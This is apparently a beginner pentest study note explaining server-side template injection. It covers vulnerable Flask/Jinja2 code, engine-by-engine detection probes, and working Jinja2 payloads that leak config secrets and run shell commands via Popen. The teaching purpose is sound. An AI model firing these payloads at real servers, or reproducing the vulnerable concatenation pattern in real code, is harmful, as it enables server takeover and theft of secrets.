---
tags: [vapt, ssti, beginner]
difficulty: beginner
module: "09 - SSTI"
topic: "09.01 What is SSTI?"
portswigger_labs: ["Server-side template injection"]
---

# 09.01 — What is Server-Side Template Injection (SSTI)?

## Core Concept

Template injection occurs when user input is embedded directly into a template string that is then processed by a template engine. Instead of just rendering the text, the template engine EXECUTES the injection as code.

```
NORMAL TEMPLATE USAGE:
  Template: "Hello {{ username }}!"
  Data: {username: "John"}
  Output: "Hello John!"
  
  {{ username }} is a template VARIABLE — it substitutes data.

VULNERABLE CODE (Python/Jinja2):
  # Wrong! Direct string concatenation:
  template = "Hello " + user_input + "!"
  return render_template_string(template)
  
  # User enters: {{ 7*7 }}
  # Template becomes: "Hello {{ 7*7 }}!"
  # Jinja2 evaluates: 7*7 = 49
  # Output: "Hello 49!"
  
  → Template engine evaluated the user's expression!
  → Can escalate to read files, env vars, and RCE!
```

---

## How Template Engines Work

```
WEB APP FLOW (normal):
  Request → Controller → Template + Data → HTML Response
  
  Template file:
    <h1>Hello {{ user.name }}</h1>  ← placeholder
  
  Data:
    user.name = "Alice"
  
  Output:
    <h1>Hello Alice</h1>

SSTI FLOW (vulnerable):
  Template file is BUILT from user input:
    template_string = "Hello " + request.args['name'] + "!"
    render_template_string(template_string)
  
  Attacker sends name={{ 7*7 }}
    template_string = "Hello {{ 7*7 }}!"
    → Jinja2 evaluates {{ 7*7 }} = 49
    Output: "Hello 49!"
  
  Attacker sends name={{ config }}
    → Outputs Flask configuration including SECRET_KEY!
```

---

## SSTI vs XSS — Key Difference

```
XSS:
  User input → HTML page → BROWSER executes JavaScript
  Victim: client-side browser
  Impact: steal cookies, redirect, keylog

SSTI:
  User input → Template → SERVER executes code
  Victim: server-side execution engine
  Impact: RCE, file read, server takeover!
  
SSTI > XSS in severity!
  XSS = client-side JS execution
  SSTI = SERVER-SIDE code execution (often leads to full RCE)
```

---

## Impact

```
SSTI IMPACT SCALE:
  LOW:
    Read template variables, config values
    
  HIGH:
    Read arbitrary files on server:
      {{ ''.__class__.__mro__[1].__subclasses__() }}
      → Lists all Python classes → can access OS
    Read environment variables:
      {{ config['SECRET_KEY'] }}
      {{ environ }}
      
  CRITICAL:
    Remote Code Execution:
      {{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate() }}
      → Runs 'id' command on server!
    
    Read /etc/passwd, database credentials, API keys
    Write files, create backdoors, reverse shell!
```

---

## Template Engines by Language

```
PYTHON:
  Jinja2    (Flask default) → {{ }} for vars, {% %} for logic
  Mako      → ${} for vars
  Cheetah   → $var
  
PHP:
  Twig      → {{ }} like Jinja2
  Smarty    → {$var}
  Blade     (Laravel) → {{ $var }}
  
JAVA:
  FreeMarker → ${var}
  Velocity   → $var
  Pebble     → {{ var }}
  Thymeleaf  → th:text="${var}"
  
RUBY:
  ERB       → <%= var %>
  Haml      → = var
  Slim      → = var
  
.NET:
  Razor     → @Model.Property
  
JAVASCRIPT (Node.js):
  Handlebars → {{ var }}
  EJS        → <%= var %>
  Pug        → #{var}
  Nunjucks   → {{ var }}
```

---

## Where to Find SSTI

```
HIGH-PROBABILITY LOCATIONS:
  ✓ Error messages: "Hello John, error in template at line..."
  ✓ Email templates: "Dear {{name}}, your order..."
  ✓ Search results: "No results found for {{query}}"
  ✓ Custom 404/500 pages: "URL {{path}} not found"
  ✓ Notification/alert messages
  ✓ User profile display: bio, name fields
  ✓ Invoice/document generation
  ✓ Report generation features
  ✓ Any field that appears in generated emails
  ✓ "Personalized" content features
```

---

## Basic SSTI Detection

```bash
# UNIVERSAL SSTI POLYGLOT:
# Submit this to any input field that reflects in the response:
${{<%[%'"}}%\

# MATH TEST (simplest detection):
{{7*7}}     → If output is 49 → Jinja2/Twig
${7*7}      → If output is 49 → FreeMarker/Velocity/Theetah
<%= 7*7 %>  → If output is 49 → ERB (Ruby)
#{7*7}      → If output is 49 → Pug

# IF 7*7 OUTPUTS 49 → SSTI CONFIRMED!
# If outputs {{7*7}} literally → template escaping (not vulnerable)
# If outputs error → may still be vulnerable (wrong syntax for that engine)
```

---

## ASCII Diagram: SSTI Attack Flow

```
USER INPUT         APPLICATION CODE          TEMPLATE ENGINE       SERVER OS
----------         ----------------          ---------------       ---------
{{ 7*7 }}    →    template = "Hello         Jinja2 evaluates
                   " + user_input            {{ 7*7 }} = 49
                   render_template           
                   _string(template)
                                             Output: "Hello 49"

{{ config }}       template = "Hello         Returns Flask           
                   " + user_input            config dict
                                             including SECRET_KEY!

{{ ''.__class__   template = "Hello         Python introspection
  .__mro__[1]     " + user_input            walks class hierarchy
  .__subclasses   render_template            finds Popen class        Popen('id')
  ()[408]          _string(template)         executes                  runs 'id'
  ('id',shell=
  True,stdout=-1)
  .communicate()
  }}
                                                          ←←← uid=33(www-data) ←←←
```

---

## Related Notes
- [[02 - Template Engines Overview]] — all template engine syntax
- [[03 - Detecting SSTI]] — polyglot detection methodology
- [[04 - SSTI in Jinja2]] — Python/Flask specific exploitation
- [[08 - SSTI to RCE Escalation]] — full exploitation chain
- [[Module 08 - Command Injection]] — similar impact, different entry
